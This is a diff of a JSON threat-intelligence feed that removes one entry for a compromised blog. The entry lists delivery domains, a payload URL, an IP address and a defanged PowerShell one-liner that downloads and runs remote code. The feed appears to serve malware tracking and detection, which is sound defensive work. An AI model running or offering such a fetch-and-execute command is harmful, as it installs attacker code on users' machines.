@@ -1601,25 +1601,5 @@
     ],
     "ReportId": "cmwwwfzju083p0omlzvig2wdi",
     "ScannedAt": "2026-11-26T01:54:15.913000+00:00"
-  },
-  {
-    "UrlDomain": "blog.beemove.com.br",
-    "DeliveryUrl": [
-      "sky.dolcefantasia.us",
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/023cf003bfe9c9b9"
-    ],
-    "IP": [
-      "162.241.63.87"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/023cf003bfe9c9b9')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/023cf003bfe9c9b9"
-    ],
-    "ReportId": "cmwwv1wul081m0omlm3tfl1hc",
-    "ScannedAt": "2026-11-26T01:15:19.635000+00:00"
   }
 ]
